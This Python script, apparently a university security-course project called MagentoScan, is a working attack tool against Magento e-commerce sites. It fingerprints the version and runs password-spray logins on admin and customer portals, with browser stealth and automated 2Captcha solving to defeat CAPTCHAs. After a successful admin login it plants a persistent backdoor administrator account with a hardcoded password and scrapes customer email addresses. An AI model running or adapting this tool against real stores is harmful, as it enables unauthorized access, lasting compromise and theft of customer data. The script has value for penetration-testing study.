'''
Copyright (c) 2024 Justin Cornwell justin.cornwell@trojans.dsu.edu

Created Date: Monday, May 27th 2024, 2:34:27 pm
Author: Justin Cornwell
----------------
Course: CSC842
Project/Lab: Cycle3 - MagentoScan
----------	---	----------------------------------------------------------
'''

from time import sleep
from datetime import datetime
from playwright.sync_api import sync_playwright
from playwright_stealth import stealth_sync      ## Broken in py 3.12
from twocaptcha import TwoCaptcha
import re, os, json, argparse, requests, urllib3

# Disable warnings about unverified HTTPS requests / self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Easier to run outside current directory
path = os.path.abspath(os.path.dirname(__file__)) + '/'

# Variables
email_re_pattern = r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+'        # Isolate email addresses
solver = ''             # API Key for CAPTCHA checks
headless = ''
target_url = ''
user_url = ''
admin_url = ''


def banner():
    print(  '\r\n\r\n' \
    '███╗   ███╗ █████╗  ██████╗ ███████╗███╗   ██╗████████╗ ██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗ \r\n'\
    '████╗ ████║██╔══██╗██╔════╝ ██╔════╝████╗  ██║╚══██╔══╝██╔═══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║ \r\n'\
    '██╔████╔██║███████║██║  ███╗█████╗  ██╔██╗ ██║   ██║   ██║   ██║███████╗██║     ███████║██╔██╗ ██║ \r\n'\
    '██║╚██╔╝██║██╔══██║██║   ██║██╔══╝  ██║╚██╗██║   ██║   ██║   ██║╚════██║██║     ██╔══██║██║╚██╗██║ \r\n'\
    '██║ ╚═╝ ██║██║  ██║╚██████╔╝███████╗██║ ╚████║   ██║   ╚██████╔╝███████║╚██████╗██║  ██║██║ ╚████║ \r\n'\
    '╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ')
    print('='*100)

# User Inputs
def prompt_yes_no(question):
    while True:
        response = input(f"{question} (yes/no): ").strip().lower()
        if response in ['yes', 'y']:
            return True
        elif response in ['no', 'n']:
            return False
        else:
            print("Please enter 'yes' or 'no'.")

def establishPersistence(user, passwd):
    # Persistence creds
    admin_email = 'Justin.Cornwell@magento.test'            # user is email
    admin_persist = 'justin.cornwell'                       # admin is username
    fName = 'Justin'
    lName = 'Cornwell'
    passwd_persist = "P@ssw0rd"
    expiration = 'Jun 1, 2051 8:43:01 AM'

    with sync_playwright() as p:
        attempt = 0
        # Browse to User Sign In
        browser = p.chromium.launch(headless=headless)
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()
        stealth_sync(page)
        page.goto(admin_url)

        # Admin login function
        while(True):
            print("[.] Attempting Login: ", user, " : ", passwd)
            page.fill('input#username', user)
            page.fill('input#login', passwd)
            page.click('button.action-login.action-primary')
            sleep(3)
            if "sign-in was incorrect" in page.content():
                print("[!] Login Failed: ", user, " : ", passwd)
                return 0
            elif "Incorrect CAPTCHA" in page.content():
                attempt +=1 
                if solver == '':
                    print("No CAPTCHA API Key found")
                    return 0
                file = path + 'imgbuffer.png'
                print(f"[-] CAPTCHA Failed...retrying (#{attempt}):", user, " : ", passwd)
                page.locator('img#backend_login').screenshot(path=file)
                result = solver.normal(file)
                print(f"[+] CAPTCHA solved: {result['code']}")
                page.fill('input#captcha', result['code'])
            else:
                print("[+] Login Successful:", user, " : ", passwd)
                page.click('li#menu-magento-backend-system')                # Click Left Menu -> System
                page.click('li.item-system-acl-users')                      # Click Sub-Menu  -> Users
                sleep(1)
                page.click('button#add.action-default.scalable.add.primary')        # Click "Add User" Button
                # Fill Admin Form
                page.fill('input#user_username', admin_persist)
                page.fill('input#user_firstname', fName)
                page.fill('input#user_lastname', lName)
                page.fill('input#user_email', admin_email)
                page.fill('input#user_password', passwd_persist)
                page.fill('input#user_confirmation', passwd_persist)
                page.fill('input#user_expires_at', expiration)
                page.fill('input#user_current_password', passwd)
                page.click('li#page_tabs_roles_section')                # Click Left Menu -> Roles
                page.click('input.radio')                # Click Administrator
                page.click('button#save.action-default.scalable.save.primary.ui-button.ui-corner-all.ui-widget')                # Click Save User
                sleep(1)
                if 'You saved the user' in page.content():
                    print(f'[+] Persistence Established: ( {admin_persist} : {passwd_persist})')
                    break
                elif 'A user with the same user name or email already exists.' in page.content():
                    print(f'[!] Account {admin_persist} already exists')
                    break
        browser.close()

def dumpUsers(user, passwd):
    with sync_playwright() as p:
        attempt = 0
        # Browse to User Sign In
        browser = p.chromium.launch(headless=headless)
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()
        stealth_sync(page)
        page.goto(admin_url)

        # Admin login function
        while(True):
            print("[.] Attempting Login: ", user, " : ", passwd)
            page.fill('input#username', user)
            page.fill('input#login', passwd)
            page.click('button.action-login.action-primary')
            sleep(3)
            if "sign-in was incorrect" in page.content():
                print("[!] Login Failed: ", user, " : ", passwd)
                return 0
            elif "Incorrect CAPTCHA" in page.content():
                attempt +=1 
                if solver == '':
                    print("No CAPTCHA API Key found")
                    return 0
                file = path + 'imgbuffer.png'
                print(f"[-] CAPTCHA Failed...retrying (#{attempt}):", user, " : ", passwd)
                page.locator('img#backend_login').screenshot(path=file)
                result = solver.normal(file)
                print(f"[+] CAPTCHA solved: {result['code']}")
                page.fill('input#captcha', result['code'])
            else:
                print("[+] Login Successful:", user, " : ", passwd)
                page.click('li#menu-magento-customer-customer')                # Click Left Menu -> Customers
                page.click('li.item-customer-manage')                      # Click Sub-Menu  -> All Customers
                sleep(3)
                email_addresses = re.findall(email_re_pattern, page.content())
                if email_addresses:
                    print("="*75)
                    print(f"    {'Role':<5} | {'Login':<32} | {'Password':<32}")
                    print("-"*75)
                    for i in email_addresses:
                        print(f"    {'user':<5} | {i:<32} | {'Unknown':<32}")
                else:
                    print("[!] No Users could be found")
                return 0
        browser.close()

def checkVersions(versions):
    # Check version page
    response = requests.get(user_url + "/magento_version", verify=False).text
    print(f"[+] Base Version: {response}")
    base_match = re.search(r'Magento\/(2\.\d.*?)', response, re.DOTALL | re.IGNORECASE).group(1)
    
    # Check Admin page, Copyright year
    response = requests.get(admin_url, verify=False).text
    footer_match = re.search(r'<footer.*?>.*?(20\d{2}).*?<\/footer>', response, re.DOTALL | re.IGNORECASE).group(1)

    # Prep patch/date diffs
    target_date = datetime(int(footer_match), 1, 1)
    closest_date = None
    closest_diff = None
    closest_patch = None

    # Looking for lowest patch of the copyright year
    for key, patches in versions.items():
        if key.startswith(base_match):
            for patch in patches:
                release_date = datetime.strptime(patch["Release date"], "%B %d, %Y")
                diff = abs((release_date - target_date).days)
                if closest_diff is None or diff < closest_diff:
                    closest_diff = diff
                    closest_date = release_date
                    closest_patch = patch["Patch"]
    print(f"[+] Version: >= {closest_patch}")

def checkSearch():
    response = requests.get('http://' + target_url + ":9200", verify=False)
    data = response.json()
    print(f"[+] Detected: {data['version']['distribution']} {data['version']['number']}")

def json2dict(fileName):
    with open(fileName, mode='r') as file:
        data = json.load(file)
    return data

def userLogin(user, passwd):
    with sync_playwright() as p: 
        attempt = 0
        if "@" not in user:
            print(f'[!] Not a valid email address: {user}')
            return 2
        # Browse to User Sign In
        browser = p.chromium.launch(headless=headless)
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()
        page.goto(user_url)
        page.get_by_role("link", name="Sign In").click()

        # User login function
        while(True):
            print("[.] Attempting Login: ", user, " : ", passwd)
            page.fill('input#email', user)
            page.fill('input#password', passwd)
            page.click('button#send2.action.login.primary')
            sleep(3)
            if "sign-in was incorrect" in page.content():
                print("[-] Login Failed: ", user, " : ", passwd)
                return 0
            elif "Please enter a valid email" in page.content():
                print("[-] Login Failed: ", user, " : ", passwd)
                return 0
            elif "Incorrect CAPTCHA" in page.content():
                attempt +=1
                if solver == '':
                    print("No CAPTCHA API Key found")
                    return 0
                file = path + 'imgbuffer.png'
                print(f"[-] CAPTCHA Failed...retrying (#{attempt}):", user, " : ", passwd)
                page.get_by_role("img", name="Please type the letters and").screenshot(path=file)
                result = solver.normal(file)
                print(f"[+] CAPTCHA solved: {result['code']}")
                page.locator("input[name=\"captcha\\[user_login\\]\"]").fill(result['code'])
            else: 
                print("[+] Login Successful:", user, " : ", passwd)
                return 1            # Exit loop for current username
        browser.close()

def adminLogin(user, passwd):
    with sync_playwright() as p:
        attempt = 0
        if '@' in user:
            print(f'[!] Email address not a valid login: {user}')
            return 2
        # Browse to User Sign In
        browser = p.chromium.launch(headless=headless)
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()
        stealth_sync(page)
        page.goto(admin_url)

        # Admin login function
        while(True):
            print("[.] Attempting Login: ", user, " : ", passwd)
            page.fill('input#username', user)
            page.fill('input#login', passwd)
            page.click('button.action-login.action-primary')
            sleep(3)
            if "sign-in was incorrect" in page.content():
                print("[!] Login Failed: ", user, " : ", passwd)
                return 0
            elif "Incorrect CAPTCHA" in page.content():
                attempt +=1 
                if solver == '':
                    print("No CAPTCHA API Key found")
                    return 0
                file = path + 'imgbuffer.png'
                print(f"[-] CAPTCHA Failed...retrying (#{attempt}):", user, " : ", passwd)
                page.locator('img#backend_login').screenshot(path=file)
                result = solver.normal(file)
                print(f"[+] CAPTCHA solved: {result['code']}")
                page.fill('input#captcha', result['code'])
            else:
                print("[+] Login Successful:", user, " : ", passwd)
                sleep(1)
                # Pull Version from bottom right corner
                exact_match = re.search(r'ver\.\s*(\d+\.\d+\.\d+\-?[a-z]*\d*)', page.content(), re.DOTALL | re.IGNORECASE).group(1)
                print(f"[+] Exact Version Match: {exact_match}")
                return 1            # Exit loop for current username
        browser.close()

def main():
    global solver, headless, admin_url, user_url, target_url
    banner()
    parser = argparse.ArgumentParser(description="MagentoScan toolset by Justin Cornwell, DSU, CSC842, Cycle3")
    
    parser.add_argument("URL", help="Target endpoints")
    parser.add_argument("-show", action="store_true", help="Show browser activity")
    parser.add_argument("-key", metavar="<2CAPTCHA API KEY>", help="API key to run normal captcha checks at 2Captcha.com")

    
    # Credentials
    parser.add_argument("-l", metavar="login", help="Use single login")
    parser.add_argument("-L", metavar="login.txt", help="Use list of logins")
    parser.add_argument("-p", metavar="passwd", help="Use single password (Spray Attack)")
    parser.add_argument("-P", metavar="passwd.txt", help="Use list of passwords (Spray Attack)")
    
    # Attack type
    parser.add_argument("-lim", type=int, default=3, help="Spray Attack limit (default=3)")
    parser.add_argument("-A", action="store_true", help="Attack Admin")
    parser.add_argument("-U", action="store_true", help="Attack User")
    parser.add_argument("-persist", action="store_true", help="Establish Persistence")
    parser.add_argument("-dump", action="store_true", help="Dump Users")

    args = parser.parse_args()
    # Processing target endpoints
    target_url = args.URL
    user_url = 'https://' + target_url
    admin_url = user_url + '/admin/'
    
    # Initialize
    if args.show:
        headless=False
    else:
        headless=True

    # Set Captcha key
    if args.key:
        solver = TwoCaptcha(args.key)

    versions = json2dict(path + "versions.json")
    checkVersions(versions)
    checkSearch()
    
    # Handle login and password options
    logins = []                     # Entered as argument
    passwords = []                  # Entered as argument
    successful = []                 # Store valid credentials
    
    # Logins
    if args.l:
        logins.append(args.l)
    if args.L:
        with open(path + args.L, 'r') as file:
            logins.extend(file.read().splitlines())
    # Passwords
    if args.p:
        passwords.append(args.p)
    if args.P:
        with open(path + args.P, 'r') as file:
            passwords.extend(file.read().splitlines())

    print('='*100)                              # Line Break
    # Print gathered logins and passwords
    print("Logins:", logins)
    print("Passwords:", passwords)
    print("Headless:", headless)
    # Set spray attack limit to reduce lockouts
    spray_limit = args.lim
    print("Spray attack limit:", spray_limit)
    print('='*100)

    # Enumerate at Admin portal
    if args.A:
        print("[-] Attempting Admin Account Enumeration")
        print('-'*100)
        for l in logins:
            for i in range(min(spray_limit, len(passwords))):
                status = adminLogin(l, passwords[i])
                if (status==1):
                    successful.append([l, passwords[i], 'admin'])
                    break
                elif (status==2):                       # Invalid username; detected email
                    break

    # Enumerate at User portal
    if args.U:
        print("[-] Attempting User Account Enumeration")
        print('-'*100)
        for l in logins:
            for i in range(min(spray_limit, len(passwords))):
                status = userLogin(l, passwords[i])
                if (status==1):
                    successful.append([l, passwords[i], 'user'])
                    break
                elif (status==2):                       # Invalid email
                    break
    
    valid_admin_login = ''
    valid_admin_passwd = ''
    if successful:
        print("="*75)
        print(f"    {'Role':<5} | {'Login':<32} | {'Password':<32}")
        print("-"*75)
        for i in range(len(successful)):
            print(f"    {successful[i][2]:<5} | {successful[i][0]:<32} | {successful[i][1]:<32}")
            if (successful[i][2] == 'admin'):
                valid_admin_login = successful[i][0]
                valid_admin_passwd = successful[i][1]

        print('-'*100)
        # Inject Admin Login
        if args.persist or (prompt_yes_no('Would you like to attempt to gain persistent Admin access?')):
            if valid_admin_login and valid_admin_passwd: 
                print(f"[-] Attempting Persistence: {valid_admin_login}:{valid_admin_passwd} ")
                print('-'*100)
                establishPersistence(valid_admin_login, valid_admin_passwd)
            else:
                print('[!] No valid admin credentials to attempt persistence')
        
        # Extract Users
        if args.dump or (prompt_yes_no('Would you like to attempt to dump the user list?')):
            if valid_admin_login and valid_admin_passwd: 
                print('='*100)
                print(f"[-] Attempting Dump: {valid_admin_login}:{valid_admin_passwd} ")
                print('-'*100)
                dumpUsers(valid_admin_login, valid_admin_passwd)
            else:
                print('[!] No valid admin credentials to dump users')

if __name__ == "__main__":
    main()